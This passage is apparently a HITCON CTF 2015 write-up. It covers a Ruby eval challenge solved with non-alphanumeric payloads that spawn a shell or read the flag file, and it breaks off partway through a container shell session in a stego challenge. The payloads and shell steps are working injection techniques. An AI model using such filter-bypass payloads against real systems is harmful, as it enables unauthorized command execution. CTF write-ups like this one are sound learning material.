&lt;p&gt;The flag is &lt;code&gt;hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;MISC - hard to say [50*4]&lt;/h2&gt;
&lt;p&gt;A description  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ruby on Fails.  
FLAG1: nc 54.199.215.185 9001  
FLAG2: nc 54.199.215.185 9002  
FLAG3: nc 54.199.215.185 9003  
FLAG4: nc 54.199.215.185 9004  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;with a Ruby source code &lt;code&gt;hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby  &lt;/span&gt;

&lt;span class="nb"&gt;fail&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flag?&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="vg"&gt;$stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;  

&lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;to_i&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hi, I can say &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; bytes :P&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="vg"&gt;$stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip!&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="sr"&gt;/[[:alnum:]]/&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
  &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;oh... I cannot say this, maybe it is too long or too weird :(&amp;#39;&lt;/span&gt;  
  &lt;span class="nb"&gt;exit&lt;/span&gt;  
&lt;span class="k"&gt;end&lt;/span&gt;  

&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I think size = &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; is ok to me.&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_s&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;..-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The program will accept an input.  &lt;/li&gt;
&lt;li&gt;There's a flag at &lt;code&gt;./flag&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;There's a input length limit which has been assigned as argv[0] since the program started.  &lt;ul&gt;
&lt;li&gt;For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;You cannot have alphabets and numbers in the input.  &lt;/li&gt;
&lt;li&gt;If your input pass the length and non-alnum test, it will be the argument of &lt;code&gt;eval()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;The program print out the result of &lt;code&gt;eval(input)&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Flag1 (1024 bytes)&lt;/h3&gt;
&lt;p&gt;At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.&lt;br /&gt;
Until one of my teammates gave a link &lt;a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/"&gt;Non-Alphanumeric Ruby for Fun and Not Much Else&lt;/a&gt;.&lt;br /&gt;
After some discussions, try-and-error and with this link &lt;a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby"&gt;Calling shell commands from Ruby - Stack Overflow&lt;/a&gt;,&lt;br /&gt;
we came up with &lt;code&gt;226 bytes&lt;/code&gt; solution for flag1.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$__&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@__&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;which equal to  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat ./flag&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;as a string input.&lt;br /&gt;
then we got flag1.&lt;br /&gt;
&lt;code&gt;hitcon{what does the ruby say? @#$%!@&amp;amp;(%!#$&amp;amp;(%!@#$!$?...}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag2 (64 bytes)&lt;/h3&gt;
&lt;p&gt;After this, we got stucked with the 64 bytes limitation.&lt;br /&gt;
I came up with calling &lt;code&gt;sh&lt;/code&gt; to get shell instead of just &lt;code&gt;cat flag&lt;/code&gt;,&lt;br /&gt;
and one of my teammates found out that &lt;code&gt;$$&lt;/code&gt; is always &lt;code&gt;4&lt;/code&gt; on the target server.&lt;br /&gt;
So, we came up with the &lt;code&gt;61 bytes&lt;/code&gt; solution for flag2.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vi"&gt;@_&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="vg"&gt;$_&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# $_ = 1, @_ = 10, $. = 104, $.+@_+$_ = 115; ascii(&amp;#39;s&amp;#39;) == 115; ascii(&amp;#39;h&amp;#39;) == 104;  &lt;/span&gt;
&lt;span class="c1"&gt;# `#{&amp;#39;&amp;#39;&amp;lt;&amp;lt;115&amp;lt;&amp;lt;104}` == `#{&amp;#39;sh&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After got the shell, just type &lt;code&gt;cat flag&lt;/code&gt; then &lt;code&gt;^D&lt;/code&gt; to get the output.&lt;br /&gt;
We got flag2.&lt;br /&gt;
&lt;code&gt;hitcon{Ruby in Peace m()m}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag3 (36 bytes)&lt;/h3&gt;
&lt;p&gt;One of my teammates came up with calling &lt;code&gt;$0&lt;/code&gt; instead of &lt;code&gt;sh&lt;/code&gt; to get shell,&lt;br /&gt;
we got the &lt;code&gt;26 bytes&lt;/code&gt; solution.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="vg"&gt;$$&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `#{&amp;#39;$&amp;#39;&amp;lt;&amp;lt;48}` == `#{&amp;#39;$0&amp;#39;}`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag3&lt;br /&gt;
&lt;code&gt;hitcon{My cats also know how to code in ruby :cat:}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Flag4 (10 bytes)&lt;/h3&gt;
&lt;p&gt;After this, I was trying to find how to just embed number into the string not by using &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;.&lt;br /&gt;
I found this link &lt;a href="http://stackoverflow.com/questions/17169671/ruby-eval-with-string-interpolation"&gt;Ruby: eval with string interpolation - Stack Overflow&lt;/a&gt;.&lt;br /&gt;
I also found that the predefined variable &lt;code&gt;$.&lt;/code&gt; is &lt;code&gt;The number of the last line read from the current input file.&lt;/code&gt;&lt;br /&gt;
It means that in this use case, &lt;code&gt;$.&lt;/code&gt; will always be &lt;code&gt;1&lt;/code&gt;.&lt;br /&gt;
so I came up with &lt;code&gt;11 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Still 1 byte more than the limitation,&lt;br /&gt;
I kept finding if there's a predefined variable in Ruby defualt to &lt;code&gt;0&lt;/code&gt; or&lt;br /&gt;
if &lt;code&gt;nil&lt;/code&gt; can be trans to &lt;code&gt;0&lt;/code&gt; because lots of predefined variable are default to &lt;code&gt;nil&lt;/code&gt;.&lt;br /&gt;
But NO.  &lt;/p&gt;
&lt;p&gt;Then one of my teammates came up with the &lt;code&gt;10 bytes&lt;/code&gt; solution,&lt;br /&gt;
by using &lt;code&gt;~&lt;/code&gt;, the &lt;code&gt;Binary Ones Complement Operator&lt;/code&gt;. (bitwise Not)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~-&lt;/span&gt;&lt;span class="vg"&gt;$.&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  

&lt;span class="c1"&gt;# `$#{~-1}` == `$#{0}` == `$0`  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we got flag4&lt;br /&gt;
&lt;code&gt;hitcon{It's hard to say where ruby went wrong QwO}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;After the competition end,&lt;br /&gt;
the author of this challenge released the same 10 bytes solution on IRC.&lt;br /&gt;
But said they got a &lt;code&gt;9 bytes&lt;/code&gt; solution  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sb"&gt;`$&lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="sr"&gt;//&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I don't know how this solution works,&lt;br /&gt;
but it does not work on my computer with Ruby 2.2.3,&lt;br /&gt;
which &lt;code&gt;~//&lt;/code&gt; will be treat as &lt;code&gt;nil&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt;.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Stego - Piranha Gun [50]&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning &amp;quot;piranha&amp;quot; projectile that costs no ammunition.  
`nc 54.178.235.243 10004`  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="m"&gt;54&lt;/span&gt;.178.235.243 &lt;span class="m"&gt;10004&lt;/span&gt;  
bash: cannot &lt;span class="nb"&gt;set&lt;/span&gt; terminal process group &lt;span class="o"&gt;(&lt;/span&gt;-1&lt;span class="o"&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class="k"&gt;for&lt;/span&gt; device  
bash: no job control in this shell  
bash: /root/.bashrc: Permission denied  
root@ip-172-31-19-201:/home/PiranhaGun# ls  
ls  
README  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After connected to the server, there's a README.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# cat README  
cat README  
The Piranha Gun can be found in &amp;quot;jungle.chest&amp;quot;.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We searched if there's a file or directory with this name by using  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep -r "jungle.chest" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "jungle" / 2&amp;gt;/dev/null&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;grep -r "chest" / 2&amp;gt;/dev/null&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;But NO. There's only a directory &lt;code&gt;/chest&lt;/code&gt;, but it's empty.  &lt;/p&gt;
&lt;p&gt;After tried something else, we still stucked.&lt;br /&gt;
Then, one of my teammates said he remembered security issue about the &lt;code&gt;proc&lt;/code&gt; in container.&lt;br /&gt;
After took a look at &lt;code&gt;ps&lt;/code&gt;, we got a clue.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/home/PiranhaGun# ps  
ps  
Error, do this: mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# mount -t proc proc /proc  
mount -t proc proc /proc  
root@ip-172-31-19-201:/home/PiranhaGun# cd /proc  
cd /proc  
root@ip-172-31-19-201:/proc# ls -al  
ls -al  
total 4  
dr-xr-xr-x 128 nobody nogroup               0 Oct 19 05:25 .  
drwxr-xr-x  23 nobody nogroup            4096 Oct 16 13:29 ..  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 1  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 2  
dr-xr-xr-x   9 root   root                  0 Oct 19 05:26 7  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 acpi  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 buddyinfo  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 bus  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  
dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  
dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  
-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  
-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  
lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&amp;gt; self/mounts  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  
lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&amp;gt; self/net  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  
dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&amp;gt; 7  
-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  
